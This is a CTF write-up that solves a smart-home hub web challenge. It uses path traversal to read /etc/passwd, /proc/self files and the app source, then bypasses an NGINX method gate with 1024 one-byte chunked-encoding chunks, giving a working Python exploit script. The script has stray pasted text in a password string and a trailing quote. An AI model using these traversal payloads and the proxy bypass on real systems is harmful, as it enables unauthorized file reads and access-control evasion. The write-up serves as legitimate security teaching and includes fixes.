+++
title = "HopHub Web Challenge | FahemSec"
date = "2026-10-01"
tags = ["CTF", "Web", "Chunked-Encoding", "Medium"]
description = "Normal user to front-door unlock: NGINX json_set reads method from $request_body, Flask trusts the proxy, and 1024 one-byte chunks blind the gate while Flask still sees valid JSON."
draft = false
+++

<!-- Cover: `feature.png` (1280x721), same size as `canon-collapse/feature.png`. -->

Hey Everyone, this one is my favorite type of web challenge, no RCE, no SQLi, just two layers disagreeing (**Parser Diffrential**) about the same request bytes. Target is **HubManager 2.4.1** at `http://95.217.6.37:30001/`, box `HM-7F3A21C4`. We start as nobody, we end by making `unlockDoor` hand us the flag. This challenge from [FahemSec](https://fahemsec.com/) platform if you want to solve. Let's digging on :"

You only get an IP + port. Box is a smart-home hub simulator:

```text
http://95.217.6.37:30001/
HubManager HM-7F3A21C4 · fw 2.4.1
nginx/1.31.6 + Flask backend, one RPC endpoint: POST /api/v1/rpc
```

<img width="1156" height="696" alt="Screenshot 2026-10-01 231318" src="https://github.com/user-attachments/assets/02ccf27d-a433-4e56-b092-7c3b47c8e030" />

After login you will see the hub manger:

<img width="1917" height="912" alt="image" src="https://github.com/user-attachments/assets/493b40e1-953d-48ea-9ef1-5e0aa7a37ea5" />

JS on that page does everything via:

```text
POST /api/v1/rpc Content-Type: application/json {"method":"..."}
```

# Enumerate Different Methods

Try one per tab:

```json
{"method":"whoami"}
{"method":"getHubInfo"}
{"method":"listDevices"}
{"method":"listCapabilities"}
{"method":"getState","device":"front_door"}
```

For `listDevices`:

<img width="1262" height="673" alt="Screenshot 2026-10-01 183904" src="https://github.com/user-attachments/assets/2c1feb80-34f0-486f-b5b5-98bf031b9b00" />


For `listCapabilities`:

<img width="1286" height="720" alt="Screenshot 2026-10-01 183535" src="https://github.com/user-attachments/assets/a0dae21f-f9d0-4801-bdee-6713385182f3" />


**What does this mean?**

App tells a low-priv user about privileged methods. `scope` looks like docs, not enforcement. Who blocks us?

## Prove the Gate — Direct unlockDoor = 403

If you tried to send a request, you will get 403:

```json
{"method":"unlockDoor","device":"front_door"}
```

```http
HTTP/1.1 403 Forbidden

{"error":"method not permitted"}
```

# Source Disclosure: exportRules Traversal

Writers always skip this step with one sentence: "then `exportRules` had traversal, read the source." That hides the only question that matters on a blackbox: how did you know to look at `exportRules` at all?

## listCapabilities has 24 entries, not 8

That screenshot above shows 8. The response has 24, and the three privileged methods sit at the bottom, which is the worst place to start because they are exactly the ones NGINX blocks. Chasing them is how you end up three hours deep in parser differentials.

Sort by parameter shape instead:

| Signal | Methods | Why |
|---|---|---|
| a string that names a file (`name?`, `file`, `path`, `log`) | `exportRules` | user value that may hit the filesystem |
| file verb: `export` `download` `backup` `snapshot` | `exportRules` | exporters read a path |
| `scope: public` | `exportRules` | testable as plain `role:user` |
| `id` only | `saveScene`, `setRuleEnabled`, `deleteRule` | not file sinks, but IDOR candidates |

Same table works on any JSON-RPC target: every param a human would call a filename is an untrusted path until you read the handler.

## ExportRules Takes A Name

The capability object hands it over:

```json
{"method": "exportRules", "scope": "public", "params": ["name?"],
 "summary": "Snapshot the current rules to a bundle, or download a saved bundle by name."}
```

`name?` is one attacker-controlled string. "download a saved bundle by name" means the handler resolves it, and anything an exporter resolves is a path. The bug was never hidden, it was in a field you skip because you grep for `privileged`.

## The Error Echoes Your Input

Baseline it before attacking:

```json
{"method":"exportRules"}
{"method":"exportRules","name":"rules.json"}
{"method":"exportRules","name":"nope.json"}
```

```text
no name     -> {"ok":true,"file":"<you>.json","bundle":{...}}
rules.json  -> {"ok":false,"error":"no export named rules.json"}
nope.json   -> {"ok":false,"error":"no export named nope.json"}
```

`no export named rules.json` contains the exact string I sent. That is `open(X)` raising and the handler echoing the argument. First hard evidence the param is a path.

The oracle it gives you, with limits:

| Input | Result |
|---|---|
| readable file | `{"ok":true,"content":"..."}` |
| missing file | `no export named X` |
| directory (`/etc`) | `no export named /etc` -- `IsADirectoryError` swallowed |
| symlink to dir (`/proc/self/cwd`) | same error, so it is `open()` not `listdir()` |
| file over 64 KiB | cut at exactly 65536, no warning |
| binary | valid JSON, 20038 replacement chars out of 65536 |

All of it is HTTP 200 with `ok:false`. Status code carries no signal here, you have to read the body.

## Absolute Path Beats ../

Instinct says `../../../../app/app.py`. Don't count yet. The bug is `os.path.join(base, user_value)` and join has one behavior that beats everything:

```python
os.path.join("/app/data/exports", "/etc/passwd")   # -> "/etc/passwd"
```

An absolute second arg throws the base away:

```json
{"method":"exportRules","name":"/etc/passwd"}
```

```text
{"ok":true,"content":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:..."}
```

One request, no depth arithmetic. Every `../` I would have written was me compensating for not knowing the API.

## Ask The Process Where It Lives

```json
{"method":"exportRules","name":"/proc/self/environ"}
```

```text
PWD=/app
```

```json
{"method":"exportRules","name":"/proc/self/cmdline"}
```

```text
/usr/local/bin/python3.12 /usr/local/bin/gunicorn --preload -w 1 -b 0.0.0.0:5000 app:app
```

`PWD=/app` and `app:app`, so depth is arithmetic not guessing. Exports live in `/app/data/exports`, three levels down:

| `name` | Result |
|---|---|
| `../etc/passwd` | `no export named` |
| `../../etc/passwd` | `no export named` |
| `../../../etc/passwd` | content |
| `/etc/passwd` | content |

`..%2f` and `....//` both failed too. Value comes from a JSON body, there is no URL decoding in the path, so filter bypasses for `../` are dead weight here.

## The Dump

```json
{"method":"exportRules","name":"/app/app.py"}
{"method":"exportRules","name":"/etc/nginx/nginx.conf"}
```

<img width="1495" height="742" alt="image" src="https://github.com/user-attachments/assets/fa0fbc74-1b83-4667-afc3-8bef6b0c877c" />

Check it is the running code, not a decoy, by matching lines against what you already measured:

| Source says | I already knew |
|---|---|
| `return 403 '{"error":"method not permitted"}'` | exact 403 body, byte for byte, and Flask has no 403 anywhere in it |
| `client_max_body_size 1024` | 1023 and 1024 give 403, 1025 gives 413 |
| `fh.read(MAX_EXPORT)` = 65536 | `/bin/ls` came back exactly 65536 |
| `server backend:5000` | only 30001 is open outside, 5000 and 8080 are not |
| `p.unlink(missing_ok=True)` | `/run/hub/flag` is not readable |

If a recovered file contradicts something you measured yourself, you are reading the wrong file.

## The Flag File Is Gone

The source killed more work than it gave me:

```python
FLAG = _secret("flag", "HM_no_flag_set").strip()
```

```python
def _secret(name, default):
    p = _SECRETS / name
    if not p.exists():
        return default
    v = p.read_text()
    p.unlink(missing_ok=True)
    return v
```

Read into a global at import, then deleted. Confirmed, `/run/hub/flag` is not there at any point.

So the file read was never the exploit, it was the map. Every instinct says spray `/flag`, `/flag.txt`, `/run/hub/flag`. Those are all dead, the only copy left is the `FLAG` variable in memory, and the one method that returns it is the one NGINX blocks.

**What does this mean?**

We don't need to guess anymore. The server hands us its own source code and its own proxy config. `app.py` tells us what Flask will accept. `nginx.conf` tells us what NGINX will block. The bug is the gap between them.

A public method took a string called `name`, the error message echoed it back, and one `os.path.join` later the whole challenge was open.

# What NGINX Does

**Recovered gate:**

```nginx
client_max_body_size 1024;
client_body_buffer_size 1024;
json_set $rpc_method $request_body "method";
map $rpc_method $is_restricted {
  "unlockDoor" 1;
  "disableAlarm" 1;
  "factoryReset" 1;
  default 0;
}
```

<img width="1495" height="742" alt="image" src="https://github.com/user-attachments/assets/fa0fbc74-1b83-4667-afc3-8bef6b0c877c" />

Read it line by line, the bypass comes straight from here:

1. `client_max_body_size 1024;` --> Decoded body > 1024 -> 413. Ours must be <=1024.
2. `client_body_buffer_size 1024;` --> Bodies up to 1024 stay in RAM. Fragmented bodies spill to temp file on disk. Twice 1024 is screaming buffer-boundary, test exactly at 1024.
3. `json_set $rpc_method $request_body "method";` --> Parse in-memory $request_body as JSON, copy method field.
   Key fact: $request_body is empty when body was written to temp file. No RAM body = nothing to parse = $rpc_method stays empty.
4. `map ... default 0;` --> unlockDoor -> 1 -> 403. Anything else including empty -> 0 -> allow. Fail-open. Missing is treated as safe.

**What does this mean?**

NGINX blocks what it extracted, not what Flask will execute:

Normal Content-Length:

```text
Browser --{"method":"unlockDoor"}--> NGINX sees "unlockDoor" in RAM -> 403
```

**Fragmented chunked:**

```text
Browser --{"method":"unlockDoor"}--> NGINX sees "" on disk -> allow -> Flask sees "unlockDoor" -> 200 + flag
```

Proxy blind, backend seeing. That disagreement is the vulnerability.

# Why JSON Tricks Die

| Payload | Result |
|---|---|
| Same JSON + 979 spaces, Content-Length: 1024 | still 403 — padding alone not bypass |
| `{"method":"unlockDoor","method":"whoami"}` | malformed request — duplicate hook |
| last=unlockDoor dup | 403 — NGINX reads last |
| deep nesting, NaN/Infinity/1e309, surrogates, \u0000 | gate maybe blind, Flask rejects finite/scalar/utf-8 checks |
| CL+TE together | 400 |
| case / %2f / trailing slash | 404 or still blocked |

**What does this mean?**

Everything that blinds NGINX JSON also breaks Flask strict validation. Stop changing JSON meaning. Keep JSON 100% valid, change delivery.

Note: All methods I used to bypass from many resources and techniques inspired from another challenges I solved before.

# The Bypass --> Same Body, Different Framing

Insight: `$request_body` is empty when body spooled to temp file. Chunked bodies skip the allocate one buffer fast path, stream + spill, `json_set` sees nothing, but proxy still forwards file upstream.

Decoded entity exactly 1024B (under client_max_body_size, not over):

```text
45B  {"method":"unlockDoor","device":"front_door"}
+ 979B trailing spaces — legal JSON whitespace
= 1024B, no duration -> default 60
```

On wire as 1024 x 1-byte chunks:

```text
"1\r\n" + 1 byte + "\r\n" = 6 bytes per chunk
1024*6 + 5 ("0\r\n\r\n") = 6149 wire bytes
```

Generate once for Repeater paste:

```bash
python3 -c "
body=b'{\"method\":\"unlockDoor\",\"device\":\"front_door\"}'+b' '*(1024-45)
open('/tmp/body.bin','wb').write(b''.join(b'1\r\n'+bytes([b])+b'\r\n' for b in body)+b'0\r\n\r\n')
"
wc -c /tmp/body.bin # 6149
```

Then send as the body in burp like:
```http
POST /api/v1/rpc HTTP/1.1
Host: 95.217.6.37:30001
Content-Type: application/json
Cookie: session=<yours>
Transfer-Encoding: chunked
Connection: close
```

**NO Content-Length, wrench icon -> UNCHECK Update Content-Length**

One shot script to send our exploit:
```python
import socket,requests,time
BASE='http://95.217.6.37:30001'
s=requests.Session()
u='ex%d'%(int(time.time()%100000))
s.post(BASE+'/api/v1/rpc',json={'method':'register','username':u,'password':'P@ssw0rdxdg-open /tmp/render_result_final.png'})
sess=s.cookies.get('session')
body=b'{\"method\":\"unlockDoor\",\"device\":\"front_door\"}'+b' '*(1024-45)
chunked=b''.join(b'1\r\n'+bytes([b])+b'\r\n' for b in body)+b'0\r\n\r\n'
req=('POST /api/v1/rpc HTTP/1.1\r\nHost: 95.217.6.37:30001\r\nContent-Type: application/json\r\nCookie: session='+sess+'\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n').encode()+chunked
sock=socket.create_connection(('95.217.6.37',30001),timeout=10)
sock.sendall(req)
resp=b''
while True:
 p=sock.recv(4096)
 if not p: break
 resp+=p
print(resp.decode(errors='replace'))
"
```

<img width="1130" height="602" alt="image" src="https://github.com/user-attachments/assets/5e5edf1e-7e9b-4894-b2cb-dc08835bd29f" />

**Why it works:**

| Layer | It does | It sees |
|---|---|---|
| NGINX HTTP | de-chunks 1024x1B | decoded 1024B <= max, no 413 |
| NGINX json_set | reads $request_body | missing (file-backed/fragmented) |
| NGINX proxy | forwards from temp file | intact JSON |
| Flask | json.loads flat object | unlockDoor/front_door/60 |

# The Takeaway

Whole challenge is one idea: proxy does not see what backend consumes. Auth from best-effort variable that silently disappears on buffering change = fail-open.

Fix that kills class:

1. Enforce in Flask. privileged must be checked, not listed.
2. Fail closed. Empty method / parse fail / missing $request_body on JSON POST -> 400.
3. Test whole path: CL vs chunked, many-small-chunks, 1023/1024/1025, dup keys, deep JSON, bad unicode.
4. Alert when JSON POST proxied without extracted method.

# Reference
See the last version of Nginx update [here](https://nginx.org/en/CHANGES).
